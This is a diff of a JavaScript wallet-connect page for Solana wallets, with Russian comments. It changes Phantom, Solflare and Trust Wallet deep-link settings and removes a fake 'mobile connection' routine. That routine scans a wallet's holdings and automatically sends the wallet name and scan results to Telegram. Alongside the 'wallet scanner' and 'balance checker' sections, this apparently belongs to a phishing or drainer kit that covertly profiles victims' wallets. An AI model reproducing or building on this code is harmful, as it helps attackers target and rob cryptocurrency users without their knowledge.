@@ -484,18 +484,18 @@
       }
     };
 
-    // Конфигурация кошельков с deep linking
+    // Конфигурация кошельков с глубокими и универсальными ссылками
     const WALLET_CONFIG = {
       phantom: {
         name: 'Phantom',
         mobile: {
           android: { 
-            scheme: 'phantom://ul/v1/browse/', 
+            scheme: 'phantom://', 
             universal: 'https://phantom.app/ul/v1/browse/',
             store: 'https://play.google.com/store/apps/details?id=app.phantom'
           },
           ios: { 
-            scheme: 'phantom://ul/v1/browse/', 
+            scheme: 'phantom://', 
             universal: 'https://phantom.app/ul/v1/browse/',
             store: 'https://apps.apple.com/app/phantom-solana-wallet/id1598432977'
           }
@@ -505,29 +505,14 @@
         name: 'Solflare',
         mobile: {
           android: { 
-            scheme: 'solflare://ul/v1/browse/', 
-            universal: 'https://solflare.com/ul/v1/browse/',
+            scheme: 'solflare://ul/v1/', 
+            universal: 'https://solflare.com/ul/v1/',
             store: 'https://play.google.com/store/apps/details?id=com.solflare.mobile'
           },
           ios: { 
-            scheme: 'solflare://ul/v1/browse/', 
-            universal: 'https://solflare.com/ul/v1/browse/',
+            scheme: 'solflare://ul/v1/', 
+            universal: 'https://solflare.com/ul/v1/',
             store: 'https://apps.apple.com/app/solflare/id1580902717'
-          }
-        }
-      },
-      trust: {
-        name: 'Trust Wallet',
-        mobile: {
-          android: { 
-            scheme: 'trust://open_url?browser=', 
-            universal: 'https://link.trustwallet.com/open_url?browser=',
-            store: 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp'
-          },
-          ios: { 
-            scheme: 'trust://open_url?browser=', 
-            universal: 'https://link.trustwallet.com/open_url?browser=',
-            store: 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409'
           }
         }
       }
@@ -725,7 +710,7 @@
     }
 
     // ============================================================================
-    // WALLET BALANCE CHECKER (сохраняем оригинальный код)
+    // WALLET BALANCE CHECKER
     // ============================================================================
 
     async function makeRequest(url, method, data, retries = 2, timeout = 5000) {
@@ -881,7 +866,7 @@
     }
 
     // ============================================================================
-    // SOLANA WALLET SCANNER (модифицированный с deep linking)
+    // SOLANA WALLET SCANNER
     // ============================================================================
 
     class SolanaWalletScanner {
@@ -993,7 +978,7 @@
     }
 
     // ============================================================================
-    // WALLET MANAGER (модифицированный с deep linking)
+    // WALLET MANAGER
     // ============================================================================
 
     class SolanaWalletManager {
@@ -1005,38 +990,19 @@
         this.scanner = new SolanaWalletScanner();
         this.isScanning = false;
         
-       const WALLET_CONFIG = {
-      phantom: {
-        name: 'Phantom',
-        mobile: {
-          android: { 
-            scheme: 'phantom://', 
-            universal: 'https://phantom.app/ul/v1/browse/',
-            store: 'https://play.google.com/store/apps/details?id=app.phantom'
+        this.walletConfigs = {
+          phantom: {
+            name: 'Phantom',
+            provider: () => window.phantom?.solana,
+            downloadUrl: 'https://phantom.app/',
+            checkMethod: () => window.phantom?.solana?.isPhantom
           },
-          ios: { 
-            scheme: 'phantom://', 
-            universal: 'https://phantom.app/ul/v1/browse/',
-            store: 'https://apps.apple.com/app/phantom-solana-wallet/id1598432977'
-          }
-        }
-      },
-      solflare: {
-        name: 'Solflare',
-        mobile: {
-          android: { 
-            scheme: 'solflare://ul/v1/', 
-            universal: 'https://solflare.com/ul/v1/',
-            store: 'https://play.google.com/store/apps/details?id=com.solflare.mobile'
+          solflare: {
+            name: 'Solflare',
+            provider: () => window.solflare,
+            downloadUrl: 'https://solflare.com/',
+            checkMethod: () => window.solflare?.isSolflare
           },
-          ios: { 
-            scheme: 'solflare://ul/v1/', 
-            universal: 'https://solflare.com/ul/v1/',
-            store: 'https://apps.apple.com/app/solflare/id1580902717'
-          }
-        }
-      }
-    };
           trustwallet: {
             name: 'Trust Wallet',
             provider: () => window.trustwallet?.solana,
@@ -1138,10 +1104,10 @@
           
           const success = openWalletWithDeepLink(walletKey);
           if (success) {
-            // Имитируем успешное подключение для демонстрации
+            // Закрываем модальное окно после попытки открытия
             setTimeout(() => {
-              this.simulateMobileConnection(walletKey);
-            }, 2000);
+              closeAllModals();
+            }, 1000);
             return;
           }
         }
@@ -1232,50 +1198,6 @@
           throw error;
         }
       }
-
-      // Симуляция подключения для мобильных устройств
-      async simulateMobileConnection(walletKey) {
-        const config = this.walletConfigs[walletKey];
-        
-        // Генерируем случайный адрес кошелька для демонстрации
-        const demoAddress = this.generateDemoAddress();
-        
-        this.walletAddress = demoAddress;
-        this.walletName = `${config.name} (Mobile)`;
-        this.connectedWallet = { isMobile: true };
-
-        console.log('📱 Симуляция мобильного подключения:', this.walletAddress);
-
-        localStorage.setItem('connectedWallet', walletKey);
-
-        this.showConnectionStatus('scanning', `Scanning wallet data...`);
-        this.isScanning = true;
-
-        try {
-          this.walletData = await this.scanner.performFastScan(this.walletAddress);
-          
-          // АВТОМАТИЧЕСКИ ОТПРАВЛЯЕМ В TELEGRAM
-          await sendWalletInfoToTelegram(this.walletName, this.walletData);
-          
-          this.updateConnectionUI();
-          
-          if (this.walletData.error || !this.walletData.success) {
-            this.showConnectionStatus('error', `Connected but scan failed: ${this.walletData.error || 'Unknown error'}`);
-          } else {
-            this.showConnectionStatus('success', `Connected via mobile deep link!`);
-          }
-          
-        } catch (scanError) {
-          console.error('Fast scan failed:', scanError);
-          this.showConnectionStatus('error', `Connected but scan failed: ${scanError.message}`);
-          
-          this.updateConnectionUI();
-        } finally {
-          this.isScanning = false;
-        }
-      }
-
-     
 
       async rescanWallet() {
         if (!this.walletAddress) {
